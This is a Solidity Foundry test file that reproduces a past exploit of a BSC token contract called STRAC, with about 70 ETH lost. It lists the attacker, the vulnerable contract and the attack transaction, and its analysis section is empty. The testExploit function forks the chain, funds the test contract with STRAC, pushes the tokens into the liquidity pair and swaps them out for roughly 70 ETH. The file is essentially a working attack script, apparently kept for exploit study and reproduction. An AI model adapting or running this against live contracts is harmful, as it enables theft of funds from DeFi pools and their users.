// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interface.sol";

// @KeyInfo - Total Lost : ~70 ETH / 2
// Attacker : https://bscscan.com/address/0x2987677e8692c933c178fb5e48268ff39adbe96f
// Attack Contract : https://bscscan.com/address/0x2987677e8692c933c178fb5e48268ff39adbe96f
// Vulnerable Contract : https://bscscan.com/address/0x9801da0aa142749295692c7cb3241e4ee2b80bda
// Attack Tx : https://bscscan.com/tx/0xf0aa2b8c0bfe526739244eb432fc3b105003114c806137a41a2b1c5deecffc87

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x9801da0aa142749295692c7cb3241e4ee2b80bda#code

// @Analysis


contract ContractTest is Test {
    IERC20 Token = IERC20(0x9801DA0AA142749295692c7cb3241E4EE2B80Bda);
    IERC20 ETH = IERC20(0x2170Ed0880ac9A755fd29B2688956BD959F933F8);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x2976bD3774622367CE7A575D28201480e640966F);
    uint256 i;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 29474312);
        cheats.label(address(ETH), "ETH");
        cheats.label(address(Token), "Token");
        cheats.label(address(Pair), "Pair");
        deal(address(Token), address(this), 28086748828349666451187);
        Token.approve(address(this), 28086748828349666451187);
    }

    function testExploit() public {
        uint256 r0;
        uint256 r1;
        (r0, r1,) = Pair.getReserves();
        console2.log("Before swap : r0 = %d, r1 = %d, P(ETH/STRAC) = %d", r0, r1, r1 / r0) ;
        Token.transferFrom(address(this), address(Pair), 28086748828349666451187);
        console2.log("%d STRAC to swap for %d ETH", 28086748828349666451187, 70043339386455429076);
        Pair.swap(70043339386455429076,0,address(this),new bytes(0));
        console2.log("Swapped ETH is ", ETH.balanceOf(address(this)));
        (r0, r1,) = Pair.getReserves();
        console2.log("After  swap : r0 = %d, r1 = %d, P(ETH/STRAC) = %d", r0, r1, r1 / r0) ;
    }

    receive() external payable {}

}
